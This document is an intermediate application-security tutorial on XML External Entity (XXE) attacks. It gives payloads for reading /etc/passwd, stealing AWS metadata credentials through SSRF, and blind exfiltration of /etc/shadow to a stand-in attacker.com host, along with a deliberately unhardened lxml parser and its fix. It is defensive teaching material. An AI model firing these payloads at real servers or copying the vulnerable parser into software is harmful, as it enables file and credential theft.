# XML External Entities (XXE)
**Category:** App Security
**Date:** 2026-09-04
**Difficulty:** Intermediate

---

## What It Is
XML External Entities (XXE) is a vulnerability that exploits weakly configured XML parsers. When an XML parser is configured to process external entity references — a feature built into the XML specification — an attacker can use those references to make the server read local files, perform internal network requests, or in some cases execute code. The attack is embedded directly in the XML payload sent to the application.

## Why It Matters
XXE was a mainstay of the OWASP Top 10 for years and remains widespread because XML parsing libraries ship with external entity processing enabled by default. A successful attack can expose `/etc/passwd`, AWS instance metadata credentials (`169.254.169.254`), or internal-only services. CVE-2014-3660 (libxml2) and the 2014 Billion Laughs variant (CVE-2003-1564) are classic examples; more recently, XXE has appeared in SAML parsers and document upload features.

## Practical Example

### Basic File Read Attack

A typical vulnerable endpoint accepts XML input — a SOAP service, a document upload, or an API that parses XML request bodies:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
```

The parser resolves `&xxe;` by reading `/etc/passwd` and inlines the content into the parsed document tree. If the application echoes back the `<name>` field, the attacker receives the file contents.

### SSRF via XXE

The same technique works for internal network probing:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name">
]>
<data>&xxe;</data>
```

This forces the server to fetch the AWS metadata endpoint and return temporary IAM credentials.

### Blind XXE (Out-of-Band Exfiltration)

When the application does not echo parsed content, use an out-of-band channel:

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/shadow">
  <!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
  %oob;
]>
<data>&exfil;</data>
```

The parser makes an HTTP request to attacker.com carrying the file contents in the query string.

### Vulnerable Python Code

```python
from lxml import etree

def parse_user_xml(xml_data: str):
    # VULNERABLE: no parser hardening
    parser = etree.XMLParser()
    root = etree.fromstring(xml_data.encode(), parser)
    return root.find("name").text
```

### Fixed Python Code

```python
from lxml import etree

def parse_user_xml(xml_data: str):
    # Safe: external entities and DTD processing disabled
    parser = etree.XMLParser(
        resolve_entities=False,
        no_network=True,
        load_dtd=False,
    )
    root = etree.fromstring(xml_data.encode(), parser)
    return root.find("name").text
```

## How to Defend

- **Disable external entity processing** in your XML parser. For Java, set `XMLConstants.FEATURE_SECURE_PROCESSING` and disable DTD features on `DocumentBuilderFactory`; for Python/lxml, use `resolve_entities=False, load_dtd=False, no_network=True`; for PHP, call `libxml_disable_entity_loader(true)` before parsing.
- **Use a safer data format** — if your application doesn't require XML, switch to JSON, which has no entity concept.
- **Validate and allowlist** XML structure using a strict schema (XSD) before processing; reject documents that include DOCTYPE declarations unless explicitly required.
- **Apply least privilege** to the process running the parser: if it cannot read `/etc/passwd` or reach internal network ranges, XXE yields nothing useful.
- **Patch library versions** — many XML libraries have released hardened defaults in recent versions; check your dependency tree for CVEs against libxml2, Xerces, and similar parsers.

## Today's Challenge

Audit a real XML-parsing path in your codebase (or a sample project):

1. Search for calls to XML parsers: `grep -r "etree\|DocumentBuilder\|SAXParser\|simplexml_load\|XmlReader" .`
2. For each result, check whether the parser explicitly disables external entities and DTD processing.
3. Craft a test payload that references `file:///etc/hostname` and see whether the parsed output contains your machine's hostname.
4. Apply the hardening flags and confirm the payload is rejected.

Bonus: inspect any SAML authentication library your stack uses — SAML is XML-based and XXE in SAML parsers has led to full authentication bypasses.

## Key Takeaway
XML parsers trust too much by default — disable external entities explicitly, or trade XML for a format that never had them.
